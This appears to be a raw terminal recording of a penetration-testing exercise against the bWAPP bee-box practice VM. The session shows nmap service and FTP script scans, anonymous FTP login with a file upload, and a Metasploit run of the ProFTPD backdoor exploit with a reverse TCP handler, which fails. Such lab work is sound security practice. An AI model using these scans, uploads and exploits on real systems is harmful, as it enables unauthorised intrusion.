@@ -1,0 +1,555 @@
+Script started on 2020-08-18 02:55:00+05:30 [TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ ll
+total 60
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:43 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:44 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:44 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:44 01.session.script
+-rw-r--r-- 1 dinesh dinesh     0 Aug 18 02:55 terminal-log_Tue_18_Aug_2020_02:55:00_AM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap[K[K[K[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap -sV -p [K[K[K10.10.10.7
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 02:55 IST
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap -sV 10.10.10.7 -T5[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap -sV 10.10.10.7 -T5
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 02:55 IST
+Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 94.12% done; ETC: 02:58 (0:00:08 remaining)
+Nmap scan report for 10.10.10.7
+Host is up (0.016s latency).
+Not shown: 983 closed ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           ProFTPD 1.3.1
+22/tcp   open  ssh           OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+25/tcp   open  smtp          Postfix smtpd
+80/tcp   open  http          Apache httpd 2.2.8 ((Ubuntu) DAV/2 mod_fastcgi/2.4.6 PHP/5.2.4-2ubuntu5 with Suhosin-Patch mod_ssl/2.2.8 OpenSSL/0.9.8g)
+139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: ITSECGAMES)
+443/tcp  open  ssl/https?
+445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: ITSECGAMES)
+512/tcp  open  exec          netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  shell?
+666/tcp  open  doom?
+3306/tcp open  mysql         MySQL 5.0.96-0ubuntu3
+5901/tcp open  vnc           VNC (protocol 3.8)
+6001/tcp open  X11           (access denied)
+8080/tcp open  http          nginx 1.4.0
+8443/tcp open  ssl/https-alt nginx/1.4.0
+9080/tcp open  http          lighttpd 1.4.19
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port666-TCP:V=7.80%I=7%D=8/18%Time=5F3AF5F9%P=x86_64-pc-linux-gnu%r(Gen
+SF:ericLines,400,"\*\*\*\x20bWAPP\x20Movie\x20Service\x20\*\*\*\nMatching\
+SF:x20movies:\x200\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0")%r(beast2,400,"\*\*\*\x20bWAPP\x20Movie\x20Service
+SF:\x20\*\*\*\nMatching\x20movies:\x200\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
+Service Info: Host:  bee-box; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 170.73 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ ;[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ ;nmap -sV 10.10.10.7 -T5 -p[K[K[K[K[Kp21
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 02:59 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0013s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.1
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ locate .nse | grep ft[[Kp
+/usr/share/nmap/scripts/ftp-anon.nse
+/usr/share/nmap/scripts/ftp-bounce.nse
+/usr/share/nmap/scripts/ftp-brute.nse
+/usr/share/nmap/scripts/ftp-libopie.nse
+/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-syst.nse
+/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
+/usr/share/nmap/scripts/tftp-enum.nse
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap --script ftp-anon.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 03:00 IST
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.36 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap --script ftp-anon.nse 10.10.10.78[K -p 21
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 03:00 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0014s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--   1 root     www-data   543803 Nov  2  2014 Iron_Man.pdf
+| -rw-rw-r--   1 root     www-data   462949 Nov  2  2014 Terminator_Salvation.pdf
+| -rw-rw-r--   1 root     www-data   544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
+| -rw-rw-r--   1 root     www-data   526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
+| -rw-rw-r--   1 root     www-data   756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
+| -rw-rw-r--   1 root     www-data   618117 Nov  2  2014 The_Incredible_Hulk.pdf
+|_-rw-rw-r--   1 root     www-data  5010042 Nov  2  2014 bWAPP_intro.pdf
+
+Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap --script ftp-anon.nse 10.10.10.7 -p 21[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[C[C[C[C[C[1@1[1@0[1@.[1@1[1@0[1@.[1@1[1@0[1@.[1@7[1@ [C[C[1@-[1@p[1@ [1@2[1@1[1@ [C[C[C[C[C[C[C[C[Cftp-bounce.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 03:01 IST
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command
+Nmap scan report for 10.10.10.7
+Host is up (0.0016s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+
+Nmap done: 1 IP address (1 host up) scanned in 19.15 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap 10.10.10.7 -p 21 --script ftp-bounce.nse[K[K[K[K[K[K[K[K[K[K[K[K[K[Kftp-proftpd-backdoor.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 03:01 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0014s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+
+Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ nmap 10.10.10.7 -p 21 --script ftp-proftpd-backdoor.nse[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kftp-vuln-cve2010-4221.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 03:02 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0016s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+
+Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ lft
+lft      lft.db   lftp     lftpget  
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ lftp
+lftp     lftpget  
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ lftp 10.10.10.7
+  open `10.10.10.7' [Resolving host address...]                                               lftp 10.10.10.7:~> 
+lftp 10.10.10.7:~> ls
+`ls' at 0 [FEAT negotiation...]`ls' at 0 [Logging in...]                                   -rw-rw-r--   1 root     www-data   543803 Nov  2  2014 Iron_Man.pdf
+-rw-rw-r--   1 root     www-data   462949 Nov  2  2014 Terminator_Salvation.pdf
+-rw-rw-r--   1 root     www-data   544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
+-rw-rw-r--   1 root     www-data   526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
+-rw-rw-r--   1 root     www-data   756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
+-rw-rw-r--   1 root     www-data   618117 Nov  2  2014 The_Incredible_Hulk.pdf
+-rw-rw-r--   1 root     www-data  5010042 Nov  2  2014 bWAPP_intro.pdf
+lftp 10.10.10.7:/> help
+    !<shell-command>                     (commands)                           alias [<name> [<value>]]             attach [PID]
+    bookmark [SUBCMD]                    cache [SUBCMD]                       cat [-b] <files>                     cd <rdir>
+    chmod [OPTS] mode file...            close [-a]                           [re]cls [opts] [path/][pattern]
+    debug [OPTS] [<level>|off]           du [options] <dirs>                  edit [OPTS] <file>                   exit [<code>|bg]
+    get [OPTS] <rfile> [-o <lfile>]      glob [OPTS] <cmd> <args>             help [<cmd>]
+    history -w file|-r file|-c|-l [cnt]  jobs [-v] [<job_no...>]              kill all|<job_no>                    lcd <ldir>
+    lftp [OPTS] <site>                   ln [-s] <file1> <file2>              ls [<args>]                          mget [OPTS] <files>
+    mirror [OPTS] [remote [local]]       mkdir [OPTS] <dirs>                  module name [args]                   more <files>
+    mput [OPTS] <files>                  mrm <files>                          mv <file1> <file2>
+    mmv [OPTS] <files> <target-dir>      [re]nlist [<args>]                   open [OPTS] <site>
+    pget [OPTS] <rfile> [-o <lfile>]     put [OPTS] <lfile> [-o <rfile>]      pwd [-p]
+    queue [OPTS] [<cmd>]                 quote <cmd>                          repeat [OPTS] [delay] [command]
+    rm [-r] [-f] <files>                 rmdir [-f] <dirs>                    scache [<session_no>]
+    set [OPT] [<var> [<val>]]            site <site-cmd>                      source <file>
+    torrent [OPTS] <file|URL>...         user <user|URL> [<pass>]             wait [<jobno>]                       zcat <files>
+    zmore <files>
+lftp 10.10.10.7:/> put /home/dinesh/Documents/work/tmp/nc_traffic 
+`/home/dinesh/Documents/work/tmp/nc_traffic' at 0 (0%) [Connection idle]                                                                          690 bytes transferred
+lftp 10.10.10.7:/> [H[2Jlftp 10.10.10.7:/> ls
+-rw-rw-r--   1 root     www-data   543803 Nov  2  2014 Iron_Man.pdf
+-rw-rw-r--   1 root     www-data   462949 Nov  2  2014 Terminator_Salvation.pdf
+-rw-rw-r--   1 root     www-data   544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
+-rw-rw-r--   1 root     www-data   526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
+-rw-rw-r--   1 root     www-data   756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
+-rw-rw-r--   1 root     www-data   618117 Nov  2  2014 The_Incredible_Hulk.pdf
+-rw-rw-r--   1 root     www-data  5010042 Nov  2  2014 bWAPP_intro.pdf
+-rw-r--r--   1 ftp      nogroup       690 Aug 17 21:33 nc_traffic
+lftp 10.10.10.7:/> pwd
+ftp://10.10.10.7/
+lftp 10.10.10.7:/> 
+lftp 10.10.10.7:/> exit
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Insecure_FTP_Configuration[01;31mdinesh@evil[00m: [[01;34mInsecure_FTP_Configuration[00m] $ msfconsole -q 
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> search proftp
+[0m
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/freebsd/ftp/[45mproftp[0m_telnet_iac        2010-11-01       [32mgreat[0m      Yes    [45mProFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   1  exploit/linux/ftp/[45mproftp[0m_sreplace            2006-11-26       [32mgreat[0m      Yes    [45mProFTP[0mD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   2  exploit/linux/ftp/[45mproftp[0m_telnet_iac          2010-11-01       [32mgreat[0m      Yes    [45mProFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   4  exploit/unix/ftp/[45mproftp[0md_133c_backdoor       2010-12-02       [32mexcellent[0m  No     [45mProFTP[0mD-1.3.3c Backdoor Command Execution
+   5  exploit/unix/ftp/[45mproftp[0md_modcopy_exec        2015-04-22       [32mexcellent[0m  Yes    [45mProFTP[0mD 1.3.5 Mod_Copy Command Execution
+   6  exploit/windows/ftp/[45mproftp[0m_banner            2009-08-25       normal     No     [45mProFTP[0m 2.9 Banner Remote Buffer Overflow
+
+
+[4mmsf5[0m [0m> db_nmap [H[2J[4mmsf5[0m [0m> db_nmap -sV 10.10.10.7 -p 21 
+[0m[1m[34m[*][0m Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 03:04 IST
+[1m[34m[*][0m Nmap: Nmap scan report for 10.10.10.7
+[1m[34m[*][0m Nmap: Host is up (0.0015s latency).
+[1m[34m[*][0m Nmap: PORT   STATE SERVICE VERSION
+[1m[34m[*][0m Nmap: 21/tcp open  ftp     ProFTPD 1.3.1
+[1m[34m[*][0m Nmap: Service Info: OS: Unix
+[1m[34m[*][0m Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[1m[34m[*][0m Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.52 seconds
+[4mmsf5[0m [0m> db_nmap -sV 10.10.10.7 -p 21 [C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch proftp
+[0m
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/freebsd/ftp/[45mproftp[0m_telnet_iac        2010-11-01       [32mgreat[0m      Yes    [45mProFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   1  exploit/linux/ftp/[45mproftp[0m_sreplace            2006-11-26       [32mgreat[0m      Yes    [45mProFTP[0mD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   2  exploit/linux/ftp/[45mproftp[0m_telnet_iac          2010-11-01       [32mgreat[0m      Yes    [45mProFTP[0mD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   4  exploit/unix/ftp/[45mproftp[0md_133c_backdoor       2010-12-02       [32mexcellent[0m  No     [45mProFTP[0mD-1.3.3c Backdoor Command Execution
+   5  exploit/unix/ftp/[45mproftp[0md_modcopy_exec        2015-04-22       [32mexcellent[0m  Yes    [45mProFTP[0mD 1.3.5 Mod_Copy Command Execution
+   6  exploit/windows/ftp/[45mproftp[0m_banner            2009-08-25       normal     No     [45mProFTP[0m 2.9 Banner Remote Buffer Overflow
+
+
+[4mmsf5[0m [0m> use exploit/unix/ftp/proftpd_133c_backdoor
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> show options 
+[0m
+Module options (exploit/unix/ftp/proftpd_133c_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> sertt[K[K[Kt rhosts 10.10.10.7
+[0mrhosts => 10.10.10.7
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> show options 
+[0m
+Module options (exploit/unix/ftp/proftpd_133c_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> exploit 
+[0m
+[1m[34m[*][0m Started reverse TCP double handler on 10.10.10.10:4444 
+[1m[34m[*][0m 10.10.10.7:21 - Sending Backdoor Command
+[1m[31m[-][0m 10.10.10.7:21 - Not backdoored
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> search anon ftp
+[0m
+Matching Modules
+================
+
+   #    Name                                                                Disclosure Date  Rank       Check  Description
+   -    ----                                                                ---------------  ----       -----  -----------
